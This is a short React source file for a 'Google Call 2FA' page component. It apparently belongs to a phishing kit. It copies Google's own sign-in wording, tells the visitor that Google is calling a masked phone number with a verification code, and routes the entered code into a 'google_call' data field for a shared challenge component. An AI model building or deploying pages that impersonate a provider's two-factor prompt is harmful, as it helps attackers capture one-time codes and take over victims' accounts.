import React from "react";
import GoogleCodeChallenge from "./GoogleCodeChallenge";
import { getGoogleMaskedPhoneDisplay } from "../../utils/validationUtils";

function GoogleCall(props) {
  const maskedPhone = getGoogleMaskedPhoneDisplay(props.Tel);

  return (
    <GoogleCodeChallenge
      {...props}
      componentName="Google Call 2FA"
      initialMessage="Google Call 2FA Page Loaded"
      dataField="google_call"
      description={
        <>
          To help keep your account safe, Google wants to make sure it&rsquo;s
          really you trying to sign in.
          <br />
          <br />
          Google is calling {maskedPhone} with a verification code. Standard
          rates apply.
        </>
      }
    />
  );
}

export default GoogleCall;
